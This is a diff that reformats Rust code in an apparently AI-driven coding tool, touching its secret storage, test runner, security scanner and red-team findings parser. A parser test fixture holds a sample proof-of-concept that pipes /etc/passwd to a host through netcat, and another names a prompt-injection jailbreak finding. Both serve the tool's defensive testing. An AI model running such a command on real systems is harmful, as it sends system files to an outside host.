@@ -7383,7 +7383,8 @@ impl SecretMap {
         let Ok(text) = std::fs::read_to_string(path) else {
             return;
         };
-        let Ok(serde_json::Value::Object(entries)) = serde_json::from_str::<serde_json::Value>(&text)
+        let Ok(serde_json::Value::Object(entries)) =
+            serde_json::from_str::<serde_json::Value>(&text)
         else {
             // Nothing to carry over, but the bytes may still be a token, so
             // leave the file for the user rather than deleting it for them.
@@ -7466,7 +7467,10 @@ mod secret_map_tests {
         MAP.save_in(&store, &entries(&[("only", "a")])).unwrap();
 
         assert_eq!(
-            store.get_api_key("default", "anthropic").unwrap().as_deref(),
+            store
+                .get_api_key("default", "anthropic")
+                .unwrap()
+                .as_deref(),
             Some("sk-ant")
         );
     }
@@ -7497,7 +7501,8 @@ mod secret_map_tests {
         // file left behind by a failed delete holds the older value.
         let dir = tempfile::tempdir().unwrap();
         let store = store(&dir);
-        MAP.save_in(&store, &entries(&[("figma", "newer")])).unwrap();
+        MAP.save_in(&store, &entries(&[("figma", "newer")]))
+            .unwrap();
         let legacy = dir.path().join("legacy.json");
         std::fs::write(
             &legacy,
@@ -8272,7 +8277,10 @@ fn dialect_of(cmd: &str) -> TestDialect {
         TestDialect::Pytest
     } else if c.starts_with("go test") {
         TestDialect::GoTest
-    } else if ["npm", "yarn", "pnpm", "bun"].iter().any(|m| c.starts_with(m)) {
+    } else if ["npm", "yarn", "pnpm", "bun"]
+        .iter()
+        .any(|m| c.starts_with(m))
+    {
         TestDialect::Node
     } else {
         TestDialect::Unknown
@@ -8353,7 +8361,9 @@ pub async fn run_tests(
     use tokio::io::{AsyncBufReadExt, BufReader};
 
     let framework = detect_test_framework(workspace.clone()).await;
-    let custom = command.map(|c| c.trim().to_string()).filter(|c| !c.is_empty());
+    let custom = command
+        .map(|c| c.trim().to_string())
+        .filter(|c| !c.is_empty());
     let (cmd_str, dialect) = match custom {
         // A custom command runs verbatim; only its *parser* falls back to the
         // detected framework's dialect.
@@ -8696,7 +8706,13 @@ mod test_runner_tests {
 
     #[test]
     fn expansions_carry_no_shell_operators() {
-        for framework in ["cargo test", "npm test", "pytest", "go test ./...", "bun test"] {
+        for framework in [
+            "cargo test",
+            "npm test",
+            "pytest",
+            "go test ./...",
+            "bun test",
+        ] {
             let cmd = detect_test_command(framework);
             assert!(!cmd.contains("||"), "{framework} → {cmd}");
             assert!(!cmd.contains("2>&1"), "{framework} → {cmd}");
@@ -17861,8 +17877,8 @@ const REDTEAM_MAX_LIMIT: usize = 400;
 fn is_redteam_target(ext: &str) -> bool {
     // Content that is itself an attack surface for an LLM-driven product.
     const CONTENT: &[&str] = &[
-        "md", "mdx", "markdown", "txt", "rst", "adoc", "org", "prompt", "tmpl",
-        "hbs", "mustache", "jinja", "j2", "html", "htm", "ipynb",
+        "md", "mdx", "markdown", "txt", "rst", "adoc", "org", "prompt", "tmpl", "hbs", "mustache",
+        "jinja", "j2", "html", "htm", "ipynb",
     ];
     if CONTENT.contains(&ext) {
         return true;
@@ -18105,8 +18121,14 @@ fn parse_redteam_findings(file: &str, output: &str) -> Vec<RedTeamFinding> {
         if title.is_empty() && description.is_empty() {
             continue;
         }
-        let poc = parts.get(5).map(|s| s.trim().to_string()).unwrap_or_default();
-        let remediation = parts.get(6).map(|s| s.trim().to_string()).unwrap_or_default();
+        let poc = parts
+            .get(5)
+            .map(|s| s.trim().to_string())
+            .unwrap_or_default();
+        let remediation = parts
+            .get(6)
+            .map(|s| s.trim().to_string())
+            .unwrap_or_default();
 
         findings.push(RedTeamFinding {
             id: format!("{}-{}", file, findings.len()),
@@ -18192,7 +18214,9 @@ pub async fn redteam_save_session(session: RedTeamSessionInfo) -> Result<(), Str
 /// Shared by red, blue and purple so history storage cannot diverge.
 fn save_workspace_session(kind: &str, session: &RedTeamSessionInfo) -> Result<(), String> {
     let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
-    let dir = std::path::PathBuf::from(&home).join(".vibecoder").join(kind);
+    let dir = std::path::PathBuf::from(&home)
+        .join(".vibecoder")
+        .join(kind);
     std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
     let path = dir.join(format!("{}.json", session.id));
     let json = serde_json::to_string_pretty(session).map_err(|e| e.to_string())?;
@@ -19145,7 +19169,6 @@ pub async fn security_review_file(
         .collect())
 }
 
-
 /// Directories a workspace security review never descends into — build output
 /// and vendored dependencies, whose findings are not the user's to fix.
 const SECURITY_REVIEW_SKIP_DIRS: &[&str] = &[
@@ -19176,10 +19199,7 @@ const SECURITY_REVIEW_MAX_LIMIT: usize = 400;
 /// Extensions worth a security review: source and configuration, but not
 /// documentation or stylesheets, which cost a call each and yield nothing.
 fn is_security_reviewable(ext: &str) -> bool {
-    !matches!(
-        ext_to_language(ext),
-        None | Some("Markdown") | Some("CSS")
-    )
+    !matches!(ext_to_language(ext), None | Some("Markdown") | Some("CSS"))
 }
 
 /// The files a workspace security review will read.
@@ -21792,7 +21812,11 @@ mod tests {
         tmp
     }
 
-    async fn targets(root: &std::path::Path, pattern: Option<&str>, limit: Option<usize>) -> SecurityReviewTargets {
+    async fn targets(
+        root: &std::path::Path,
+        pattern: Option<&str>,
+        limit: Option<usize>,
+    ) -> SecurityReviewTargets {
         security_review_targets(
             root.to_string_lossy().to_string(),
             pattern.map(str::to_string),
@@ -21820,12 +21844,12 @@ mod tests {
         let tmp = security_review_fixture();
         let found = targets(tmp.path(), None, None).await;
         for excluded in [
-            "README.md",       // documentation
-            "styles.css",      // stylesheet
+            "README.md",  // documentation
+            "styles.css", // stylesheet
             "node_modules/pkg/index.js",
             "target/debug/build.rs",
-            "huge.rs",         // larger than the prompt can hold
-            "empty.rs",        // nothing to review
+            "huge.rs",  // larger than the prompt can hold
+            "empty.rs", // nothing to review
         ] {
             assert!(
                 !found.files.iter().any(|f| f == excluded),
@@ -21937,7 +21961,9 @@ mod tests {
     fn a_query_continued_on_the_next_line_is_left_for_verification() {
         // The interpolation could be on the line after the match; refuting here
         // would hide a real injection.
-        assert!(secscan_static_refutation("sql-inject", "    let q = format!(\"SELECT * \\").is_none());
+        assert!(
+            secscan_static_refutation("sql-inject", "    let q = format!(\"SELECT * \\").is_none()
+        );
     }
 
     #[test]
@@ -21961,10 +21987,13 @@ mod tests {
     #[test]
     fn an_uncertain_verdict_is_unverified_not_a_finding() {
         let cands = vec![candidate("SEC-0001", 10)];
-        let reply = r#"[{"id": "SEC-0001", "verdict": "uncertain", "reason": "The caller is not shown."}]"#;
+        let reply =
+            r#"[{"id": "SEC-0001", "verdict": "uncertain", "reason": "The caller is not shown."}]"#;
         let out = secscan_parse_verdicts(reply, &cands);
         assert_eq!(out[0].verification, "unverified");
-        assert!(out[0].verification_reason.contains("The caller is not shown."));
+        assert!(out[0]
+            .verification_reason
+            .contains("The caller is not shown."));
     }
 
     #[test]
@@ -21989,7 +22018,10 @@ mod tests {
     fn a_fenced_reply_is_still_parsed() {
         let cands = vec![candidate("SEC-0001", 10)];
         let reply = "Here you go:\n```json\n[{\"id\": \"SEC-0001\", \"verdict\": \"confirmed\", \"reason\": \"Tainted.\"}]\n```";
-        assert_eq!(secscan_parse_verdicts(reply, &cands)[0].verification, "confirmed");
+        assert_eq!(
+            secscan_parse_verdicts(reply, &cands)[0].verification,
+            "confirmed"
+        );
     }
 
     #[test]
@@ -22008,8 +22040,10 @@ mod tests {
             .collect::<Vec<_>>()
             .join("\n");
         assert!(contents.len() > SECSCAN_VERIFY_MAX_CHARS);
-        let (excerpt, whole) =
-            secscan_verify_excerpt(&contents, &[candidate("SEC-0001", 100), candidate("SEC-0002", 3000)]);
+        let (excerpt, whole) = secscan_verify_excerpt(
+            &contents,
+            &[candidate("SEC-0001", 100), candidate("SEC-0002", 3000)],
+        );
         assert!(!whole);
         assert!(excerpt.contains("let v100 = 100;"));
         assert!(excerpt.contains("let v3000 = 3000;"));
@@ -22649,13 +22683,41 @@ mod tests {
     fn unnamed_block_is_named_after_its_scope() {
         let cases = [
             // (fence language, source, expected path)
-            ("tsx", "export default class HeroBanner extends React.Component {}", "src/HeroBanner.tsx"),
-            ("tsx", "const PricingTable = ({ rows }) => <table/>;", "src/PricingTable.tsx"),
-            ("typescript", "export function formatCurrency(n: number) { return n; }", "src/formatCurrency.ts"),
-            ("typescript", "export interface UserProfile { id: string }", "src/UserProfile.ts"),
-            ("python", "def send_invoice(order):\n    pass", "send_invoice.py"),
-            ("rust", "pub fn parse_config(raw: &str) {}", "src/parse_config.rs"),
-            ("vue", "export default { name: 'AppHeader' }", "src/AppHeader.vue"),
+            (
+                "tsx",
+                "export default class HeroBanner extends React.Component {}",
+                "src/HeroBanner.tsx",
+            ),
+            (
+                "tsx",
+                "const PricingTable = ({ rows }) => <table/>;",
+                "src/PricingTable.tsx",
+            ),
+            (
+                "typescript",
+                "export function formatCurrency(n: number) { return n; }",
+                "src/formatCurrency.ts",
+            ),
+            (
+                "typescript",
+                "export interface UserProfile { id: string }",
+                "src/UserProfile.ts",
+            ),
+            (
+                "python",
+                "def send_invoice(order):\n    pass",
+                "send_invoice.py",
+            ),
+            (
+                "rust",
+                "pub fn parse_config(raw: &str) {}",
+                "src/parse_config.rs",
+            ),
+            (
+                "vue",
+                "export default { name: 'AppHeader' }",
+                "src/AppHeader.vue",
+            ),
         ];
         for (lang, source, expected) in cases {
             let input = format!("```{lang}\n{source}\n```\n");
@@ -30831,8 +30893,10 @@ fn parse_generated_files(response: &str) -> Result<Vec<GeneratedFile>, String> {
 
     // Seed the claimed set with every path the model stated, so a name derived
     // from code never lands on top of one the model asked for.
-    let mut used: std::collections::HashSet<String> =
-        blocks.iter().filter_map(|(path, _, _)| path.clone()).collect();
+    let mut used: std::collections::HashSet<String> = blocks
+        .iter()
+        .filter_map(|(path, _, _)| path.clone())
+        .collect();
     // Per-language ordinals: an HTML block and a CSS block in the same response
     // are each the first of their kind, and `index.html` / `styles.css` are the
     // conventional names for exactly that.
@@ -30851,10 +30915,7 @@ fn parse_generated_files(response: &str) -> Result<Vec<GeneratedFile>, String> {
             }
             None => {
                 let ext = lang_conventions(&fence_lang).0;
-                let ordinal = *ordinals
-                    .entry(ext)
-                    .and_modify(|n| *n += 1)
-                    .or_insert(1);
+                let ordinal = *ordinals.entry(ext).and_modify(|n| *n += 1).or_insert(1);
                 let (path, language) = infer_file_info(&fence_lang, &content, ordinal);
                 GeneratedFile {
                     path: unique_path(path, &mut used),
@@ -39409,7 +39470,12 @@ Include every candidate id exactly once."
 /// decides a candidate; everything else — "uncertain", "likely", a word the
 /// model invented, a missing field — leaves it unverified.
 fn secscan_verdict_word(word: &str) -> Option<&'static str> {
-    match word.trim().to_ascii_lowercase().replace([' ', '-'], "_").as_str() {
+    match word
+        .trim()
+        .to_ascii_lowercase()
+        .replace([' ', '-'], "_")
+        .as_str()
+    {
         "confirmed" | "true_positive" | "vulnerable" | "exploitable" => Some("confirmed"),
         "false_positive" | "refuted" | "not_vulnerable" | "not_exploitable" => Some("refuted"),
         _ => None,
@@ -39462,10 +39528,9 @@ fn secscan_parse_verdicts(reply: &str, candidates: &[SecScanCandidate]) -> Vec<S
                         if word.is_empty() { "missing" } else { word }
                     ),
                 ),
-                None => SecScanVerdict::unverified(
-                    &c.id,
-                    format!("The model did not decide: {reason}"),
-                ),
+                None => {
+                    SecScanVerdict::unverified(&c.id, format!("The model did not decide: {reason}"))
+                }
             }
         })
         .collect()
@@ -39480,10 +39545,21 @@ fn secscan_record_verdicts(verdicts: &[SecScanVerdict]) -> Result<(), String> {
     };
 
     let touched = items.iter_mut().fold(false, |touched, item| {
-        let id = item.get("id").and_then(|i| i.as_str()).unwrap_or("").to_string();
-        match verdicts.iter().find(|v| v.id == id).zip(item.as_object_mut()) {
+        let id = item
+            .get("id")
+            .and_then(|i| i.as_str())
+            .unwrap_or("")
+            .to_string();
+        match verdicts
+            .iter()
+            .find(|v| v.id == id)
+            .zip(item.as_object_mut())
+        {
             Some((v, obj)) => {
-                obj.insert("verification".to_string(), serde_json::json!(v.verification));
+                obj.insert(
+                    "verification".to_string(),
+                    serde_json::json!(v.verification),
+                );
                 obj.insert(
                     "verificationReason".to_string(),
                     serde_json::json!(v.verification_reason),
@@ -66955,7 +67031,8 @@ mod redteam_workspace_tests {
     fn escaped_pipes_survive_inside_a_field() {
         // A PoC payload legitimately contains '|'; an unescaped split would cut
         // the finding in half and mangle every field after it.
-        let out = r"medium|5|cmd injection|Shell metachar|desc|cat /etc/passwd \| nc host 1|sanitise";
+        let out =
+            r"medium|5|cmd injection|Shell metachar|desc|cat /etc/passwd \| nc host 1|sanitise";
         let f = parse_redteam_findings("a.sh", out);
         assert_eq!(f.len(), 1);
         assert_eq!(f[0].poc, "cat /etc/passwd | nc host 1");
@@ -67007,7 +67084,10 @@ mod redteam_workspace_tests {
 
     #[test]
     fn a_line_of_zero_leaves_the_finding_file_scoped() {
-        let f = parse_redteam_findings("README.md", "high|0|prompt injection|Jailbreak framing|d|p|fix");
+        let f = parse_redteam_findings(
+            "README.md",
+            "high|0|prompt injection|Jailbreak framing|d|p|fix",
+        );
         assert_eq!(f[0].source_line, None);
         assert_eq!(f[0].location, "README.md");
     }
